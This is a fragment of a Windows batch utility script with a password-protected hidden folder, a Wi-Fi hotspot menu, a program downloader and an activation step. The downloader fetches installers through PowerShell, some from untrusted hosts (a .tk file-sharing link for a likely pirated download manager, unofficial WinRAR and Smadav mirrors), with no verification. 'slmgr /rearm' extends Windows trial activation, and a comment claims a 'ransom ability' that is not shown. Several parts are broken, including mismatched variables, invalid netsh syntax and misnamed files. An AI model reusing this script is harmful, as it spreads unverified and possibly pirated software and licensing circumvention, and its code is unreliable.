:SHOW 
COLOR 03 
CLS 
ECHO Please enter the password to unlock the folder... 
ECHO. 
SET/P "PSWD=>" 
IF /I %PSWD% EQU %CPSD% GOTO UNLOCK 
COLOR 0C 
CLS 
ECHO The password you entered is incorrect! 
PAUSE>NUL 
GOTO SHOW 

:UNLOCK 
ATTRIB /S /D "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" -H -S 
REN "GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}" "SHIELD" 
CLS 
ECHO Folder unlocked successfully! 
PAUSE>NUL 
goto start

:shield 
MD SHIELD 
CLS 
ECHO Secure Folder created successfully! Put your files in it and secure it. You can unlock it anytime. 
PAUSE>NUL 
goto start
:hotspot
echo 1) set up hotspot
echo 2) Start Hotspot
echo 3) Stop Hotspot
set/p "hots=>"
if %cho%==1 goto sethots
if %cho%==2 goto starthots
if %cho%==3 goto stophots
:sethots
echo Setting up SHIELD Hotspot
echo wait
netsh wlan set SHIELD mode=allow ssid=SHIELD key=SHIELD keyusage=persistent
echo Hotspot set complete password is SHIELD
echo starting hotspot now
goto starthots
:starthots
echo hotspot is on
echo wait
netsh wlan start SHIELD
echo hotspot started successfully
goto start
:stophots
netsh wlan stop SHIELD
goto exit
:programlist
echo These are the recommended programs
echo 1)Firefox 42 or higher
echo 2)	Internet Download manager. 6.23 build 11  or higher
echo 3)	Winrar 
echo 4)	VLC. 
echo 5)	Ccleaner. 
echo 6)	Smadav 
echo 7)	Adobe reader / FOXIT 
echo 8)	Notepad++ 
echo 9)	Python
mkdir "C:\users\%username%\Desktop\downloads"
@echo off
color 0A
echo you are about to download 300MB of data
pause

Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://83downloadz.tk/d2467b953ab2bec8?download_token=28369fa4e4d10d8a11dfebaa2f3a234bbe21f0486125db2b82641ebfe679cf03','%userprofile%\Desktop\downloads\idm.zip')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download-installer.cdn.mozilla.net/pub/firefox/releases/52.0.2/win32/en-US/Firefox Setup Stub 52.0.2.exe','%userprofile%\Desktop\downloads\Firefox Setup 57.0.4.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download.videolan.org/vlc/last/win32/vlc-3.0.8-win32.exe','%userprofile%\Desktop\downloads\vlc-3.0.8-win32.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('http://download.notepad-plus-plus.org/repository/7.x/7.8/npp.7.8.Installer.exe','%userprofile%\Desktop\downloads\npp.7.8.Installer.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download.ccleaner.com/ccsetup563.exe','%userprofile%\Desktop\downloads\ccsetup563.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('http://www.unjuk.com/smadav2019rev130.exe','%userprofile%\Desktop\downloads\smadav2019rev130.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/2.7.15/python-2.7.15.amd64.msi','%userprofile%\Desktop\downloads\python-2.7.15.amd64.msi')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('https://download.mykehnet.org/apps/Adobe/Adobe%20Reader/11/AdbeRdr11010_en_US.exe','%userprofile%\Desktop\downloads\AdbeRdr11010_en_US.exe')"
Powershell.exe -command "(New-Object System.Net.WebClient).DownloadFile('http://tmp.sorlo.com/software/winrar/win3.9.zip','%userprofile%\Desktop\downloads\win3.9.zip')"
echo download complete and extracted to the directory.
goto start

:Activawin
echo this is temproray
slmgr /rearm
goto start

::version check
::version 2 added program download 
::version 21 added ransom ability
::version 21 added rename ability